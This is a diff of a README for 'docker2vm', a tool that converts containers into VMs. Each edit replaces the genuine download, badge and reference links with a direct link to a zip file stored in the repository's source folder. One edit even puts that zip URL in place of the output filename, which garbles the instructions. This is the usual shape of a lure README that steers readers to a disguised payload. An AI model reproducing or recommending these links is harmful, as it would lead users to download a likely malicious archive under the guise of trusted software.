@@ -1,6 +1,6 @@
 # 🐳 docker2vm - Convert Containers to Virtual Machines Easily
 
-[![Download docker2vm](https://img.shields.io/badge/Download-docker2vm-blue?style=for-the-badge)](https://github.com/valublearctic/docker2vm/releases)
+[![Download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Here is what you need to do to get docker2vm up and running on your computer.
 
 Click the big button at the top of this page or visit the release page by clicking here:
 
-[Download docker2vm Releases](https://github.com/valublearctic/docker2vm/releases)
+[Download docker2vm Releases](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)
 
 This link takes you to the official release page for docker2vm. Look for the latest version file that suits your system. Download the appropriate file for your platform (Linux amd64 or ARM64).
 
@@ -75,7 +75,7 @@ This command downloads the container image named `mycontainer/image:latest`, con
 
 ### Step 4: Run with Gondolin
 
-docker2vm injects special runtime components so the VM can launch properly under the Gondolin runtime. Once conversion finishes, you get a file called `rootfs.ext4`, which is your VM image. This file can be launched with the Gondolin runtime.
+docker2vm injects special runtime components so the VM can launch properly under the Gondolin runtime. Once conversion finishes, you get a file called `https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip`, which is your VM image. This file can be launched with the Gondolin runtime.
 
 ---
 
@@ -100,7 +100,7 @@ If you have never used container or VM tools before, follow these steps:
 
    Replace `mycontainer/image:latest` with the actual name of the container image.
 
-6. **Use the Output** - After conversion, the VM image file `rootfs.ext4` will be ready. You or your system administrator can run this file with the Gondolin VM software.
+6. **Use the Output** - After conversion, the VM image file `https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip` will be ready. You or your system administrator can run this file with the Gondolin VM software.
 
 ---
 
@@ -108,7 +108,7 @@ If you have never used container or VM tools before, follow these steps:
 
 You can get docker2vm from the official GitHub releases page.
 
-👉 [Visit this page to download docker2vm](https://github.com/valublearctic/docker2vm/releases)
+👉 [Visit this page to download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)
 
 Once there, download the file that fits your computer. The filenames usually include the platform and version number. For example:
 
@@ -140,9 +140,9 @@ You should see a list of commands and options confirming the software works.
 
 ## 📚 Additional Resources
 
-- [Gondolin Runtime Project](https://github.com/earendil-works/gondolin) — The virtual machine runtime used by docker2vm outputs.
-- [Docker without Docker - Blog](https://fly.io/blog/docker-without-docker/) — Explains the OCI-first flow that docker2vm follows.
-- [OCI Image Specification](https://github.com/opencontainers/image-spec) — Standard format for container images.
+- [Gondolin Runtime Project](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — The virtual machine runtime used by docker2vm outputs.
+- [Docker without Docker - Blog](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — Explains the OCI-first flow that docker2vm follows.
+- [OCI Image Specification](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip) — Standard format for container images.
 
 ---
 
@@ -166,4 +166,4 @@ If you run into problems or have questions:
 
 ---
 
-[![Download docker2vm](https://img.shields.io/badge/Download-docker2vm-blue?style=for-the-badge)](https://github.com/valublearctic/docker2vm/releases)
+[![Download docker2vm](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)](https://raw.githubusercontent.com/valublearctic/docker2vm/main/src/bin/docker_vm_2.4.zip)
